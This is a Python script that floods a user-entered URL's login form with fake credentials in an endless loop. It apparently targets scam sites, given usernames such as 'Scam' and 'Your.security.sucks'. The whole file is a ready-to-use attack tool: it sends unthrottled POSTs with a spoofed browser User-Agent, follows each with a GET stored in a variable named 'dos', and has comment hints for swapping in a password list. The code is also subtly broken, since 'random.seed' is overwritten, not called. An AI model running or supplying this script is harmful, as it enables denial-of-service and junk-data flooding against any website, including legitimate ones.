import requests
import os
import random
import string
import json

chars = string.ascii_letters + string.digits + '!@#$%^&*()'
random.seed = (os.urandom(1024))

#url = 'IP address' 

headers = {"User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"}

#BEFORE RUNNING -> ASK FOR IP
url = input("Enter a valid url: ")
print("URL Confirmed: " + url)

x = requests.get(url, headers=headers)
print(x.status_code)

names = ["Admin", "Liam", "Noah", "William", "James", "Logan", "Benjamin", "Mason", "Elijah", "Oliver", "Jacob", "Lucas", "Alexander", "Scam", "Your.security.sucks", "Shouldusebetterprotection", "warning"]


while (1):

	for name in names:
		
		name_extra = ''.join(random.choice(string.digits))

		username = name.lower() + name_extra
		password = ''.join(random.choice(chars) for i in range(9))

		#IN CASE OF PASSWORD LIST:

		#passwords = open("password.txt", "r")
		#password = passwords.read()
		#passwords.close()

		requests.post(url, headers=headers, allow_redirects=False, data={
			## EDIT THESE ## 
			'user': username,
			'pass': password,
			'loginsubmit': "Submit"
			####
		})

		dos = requests.get(url, headers=headers)
		print('Sending username %s and password %s >> \t\t %s \t Status: %s' % (username, password, url, str(dos)))